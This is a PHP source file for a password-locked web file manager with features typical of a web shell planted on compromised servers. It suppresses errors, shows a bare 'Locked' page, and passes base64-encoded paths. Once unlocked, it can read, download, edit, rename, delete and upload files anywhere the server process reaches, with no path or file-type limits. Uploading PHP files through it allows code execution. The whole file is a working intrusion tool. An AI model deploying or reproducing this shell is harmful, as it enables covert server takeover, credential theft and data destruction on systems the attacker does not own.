<?php
session_start();
error_reporting(0);

$MD5_HASH = "e0d5e4b3c7987761954b68591e393c52"; 

$base_url = preg_replace('/([&?])(d|edit|dl|del|zip|unzip)=[^&]*/', '', $_SERVER['REQUEST_URI']);
$url_sep = (strpos($base_url, '?') !== false) ? '&' : '?';

function encode($data) { return base64_encode($data); }
function decode($data) { return base64_decode($data); }

if (isset($_POST['login_btn'])) {
    if (md5($_POST['pass_user']) === $MD5_HASH) { $_SESSION['auth_safe'] = true; } 
}

if (!isset($_SESSION['auth_safe']) || $_SESSION['auth_safe'] !== true):
?>
<!DOCTYPE html>
<html><head><title>Locked</title><meta name="viewport" content="width=device-width, initial-scale=1">
<style>
    body { background:#0f172a; color:white; font-family:sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; }
    .box { background:#1e293b; padding:30px; border-radius:10px; width:100%; max-width:320px; border:1px solid #334155; }
    input { width:100%; padding:12px; margin:10px 0; background:#0f172a; border:1px solid #334155; color:white; border-radius:5px; box-sizing:border-box; }
    button { width:100%; padding:12px; background:#0284c7; color:white; border:none; border-radius:5px; cursor:pointer; }
</style>
</head>
<body><div class="box"><form method="POST"><input type="password" name="pass_user" placeholder="Password" required><button type="submit" name="login_btn">Unlock</button></form></div></body></html>
<?php exit; endif;

$curDir = realpath(isset($_GET['d']) ? decode($_GET['d']) : getcwd());
if (!$curDir) $curDir = getcwd();
chdir($curDir);

// --- HANDLERS ---
if (isset($_GET['dl'])) {
    $file = decode($_GET['dl']);
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    readfile($file); exit;
}
if (isset($_POST['rn'])) {
    rename(decode($_POST['old_path']), $curDir . '/' . $_POST['new_name_single']);
    header("Location: $base_url" . $url_sep . "d=" . encode($curDir)); exit;
}
if (isset($_GET['del'])) {
    $t = decode($_GET['del']);
    is_dir($t) ? @rmdir($t) : @unlink($t);
    header("Location: $base_url" . $url_sep . "d=" . encode($curDir)); exit;
}
if (isset($_POST['sv'])) {
    file_put_contents(decode($_POST['path']), $_POST['content']);
    header("Location: $base_url" . $url_sep . "d=" . encode($curDir)); exit;
}
if (isset($_FILES['up'])) { move_uploaded_file($_FILES['up']['tmp_name'], $curDir.'/'.$_FILES['up']['name']); }

if (isset($_POST['new_file']) && !empty($_POST['filename'])) {
    file_put_contents($curDir . '/' . $_POST['filename'], "");
    header("Location: $base_url" . $url_sep . "d=" . encode($curDir)); exit;
}
if (isset($_POST['new_folder']) && !empty($_POST['foldername'])) {
    mkdir($curDir . '/' . $_POST['foldername']);
    header("Location: $base_url" . $url_sep . "d=" . encode($curDir)); exit;
}

if (isset($_POST['bulk_action']) && !empty($_POST['targets'])) {
    $action = $_POST['action_type'];
    foreach ($_POST['targets'] as $t) {
        $path = decode($t);
        if ($action === 'delete') { is_dir($path) ? @rmdir($path) : @unlink($path); }
        elseif ($action === 'rename') {
            $newName = $_POST['new_names'][$t];
            if (!empty($newName)) rename($path, $curDir . '/' . $newName);
        }
    }
    header("Location: $base_url" . $url_sep . "d=" . encode($curDir)); exit;
}

// --- CSS ---
echo "<style>
    body { background:#0f172a; color:#cbd5e1; font-family:monospace; padding:20px; }
    a { color:#38bdf8; text-decoration:none; }
    table { width:100%; border-collapse:collapse; margin-top:20px; background:#1e293b; border-radius:8px; }
    td { padding:10px; border-bottom:1px solid #334155; font-size:12px; }
    .btn { padding:4px 8px; border:none; color:white; cursor:pointer; border-radius:4px; font-size:10px; background:#0284c7; }
    .input-text { background:#0f172a; color:#fff; border:1px solid #334155; padding:4px; font-size:10px; }
    select { background:#0f172a; color:#fff; border:1px solid #334155; padding:3px; border-radius:4px; font-size:11px; }
</style>";

// --- EDITOR VIEW (Harus di atas tabel agar intercept klik) ---
if (isset($_GET['edit'])):
    $f = decode($_GET['edit']); $c = htmlspecialchars(file_get_contents($f));
    echo "<h3>Edit: ".basename($f)."</h3>
    <form method='POST'>
        <input type='hidden' name='path' value='".encode($f)."'>
        <textarea name='content' style='width:100%; height:400px; background:#0f172a; color:#38bdf8; border:1px solid #334155; padding:10px;'>$c</textarea><br><br>
        <button name='sv' class='btn' style='background:#10b981; font-size:14px; padding:10px 20px;'>Save Changes</button> 
        <a href='{$base_url}{$url_sep}d=".encode($curDir)."' style='margin-left:10px; color:#f43f5e;'>Cancel</a>
    </form>";
    exit;
endif;

// --- PATH NAVIGATION ---
$pathParts = explode(DIRECTORY_SEPARATOR, $curDir);
$accum = ""; $pLinks = "";
foreach ($pathParts as $part) {
    if ($part === "") continue;
    $accum .= DIRECTORY_SEPARATOR . $part;
    $pLinks .= " / <a href='{$base_url}{$url_sep}d=".encode($accum)."'>$part</a>";
}
echo "Path: <strong>$pLinks</strong><br><br>";

// --- TOP MENU ---
echo "<div style='display:flex; gap:10px; flex-wrap:wrap; background:#1e293b; padding:15px; border-radius:8px;'>
    <form method='POST' enctype='multipart/form-data'>Upload: <input type='file' name='up'> <button class='btn'>Upload</button></form>
    <form method='POST'>New File: <input type='text' name='filename' class='input-text' placeholder='file.php'> <button name='new_file' class='btn' style='background:#10b981'>Create</button></form>
    <form method='POST'>New Folder: <input type='text' name='foldername' class='input-text' placeholder='Folder Name'> <button name='new_folder' class='btn' style='background:#f59e0b'>Mkdir</button></form>
</div>";

// --- FILE LIST ---
$items = [];
foreach (scandir($curDir) as $i) {
    if ($i == ".") continue;
    if ($i == "..") { $items[] = ['name' => '..', 'is_dir' => true, 'path' => dirname($curDir)]; continue; }
    $p = $curDir . DIRECTORY_SEPARATOR . $i;
    $items[] = ['name'=>$i, 'is_dir'=>is_dir($p), 'size'=>is_dir($p)?-1:filesize($p), 'path'=>$p];
}

echo "<form method='POST'>";
echo "<div style='margin-top:20px; background:#334155; padding:10px; border-radius:8px 8px 0 0;'>
    <input type='checkbox' onclick='for(c in document.getElementsByName(\"targets[]\")) document.getElementsByName(\"targets[]\")[c].checked = this.checked'> Select All | 
    Aksi: <select name='action_type'><option value='delete'>Hapus</option><option value='rename'>Rename (Ceklist)</option></select>
    <button name='bulk_action' class='btn' style='background:#6366f1'>Eksekusi</button>
</div>";

echo "<table><thead><tr style='background:#1e293b;color:#fff;'><td width='30'>Sel</td><td>Name</td><td>Size</td><td>Quick Rename</td><td>Action</td></tr></thead><tbody>";

foreach ($items as $i) {
    $encP = encode($i['path']);
    // Link edit atau buka folder
    $link = $i['is_dir'] ? "{$base_url}{$url_sep}d=$encP" : "{$base_url}{$url_sep}edit=$encP&d=".encode($curDir);
    
    echo "<tr>
        <td>".($i['name'] != '..' ? "<input type='checkbox' name='targets[]' value='$encP'>" : "")."</td>
        <td><a href='$link' " . ($i['name'] == '..' ? "style='font-weight:bold;color:#eab308;'" : "") . ">" . ($i['is_dir'] ? "📁 " : "📄 ") . "{$i['name']}</a></td>
        <td>" . ($i['is_dir'] ? "DIR" : round($i['size']/1024, 2)."KB") . "</td>
        <td>
            ".($i['name'] != '..' ? "
            <div style='display:flex; gap:5px;'>
                <input type='text' name='new_names[$encP]' value='{$i['name']}' class='input-text' style='width:120px;'>
                <button type='submit' name='rn' class='btn' style='background:#475569' onmouseover='document.getElementById(\"single_rn_$encP\").value=document.getElementsByName(\"new_names[$encP]\")[0].value'>Ren</button>
                <input type='hidden' name='old_path' value='$encP'>
                <input type='hidden' name='new_name_single' id='single_rn_$encP' value='{$i['name']}'>
            </div>" : "")."
        </td>
        <td>
            ".(!$i['is_dir'] ? "<a href='{$base_url}{$url_sep}dl=$encP' style='color: #acffab; background: #025400; padding: 4px 14px; border-radius: 5px;'>DL</a> | " : "")."
            ".($i['name'] != '..' ? "<a href='{$base_url}{$url_sep}del=$encP&d=".encode($curDir)."' style='color: #ffb7c3; background: #bb0000; padding: 4px 14px; border-radius: 5px;' onclick='return confirm(\"Hapus?\")'>DEL</a>" : "")."
        </td>
    </tr>";
}
echo "</tbody></table></form>";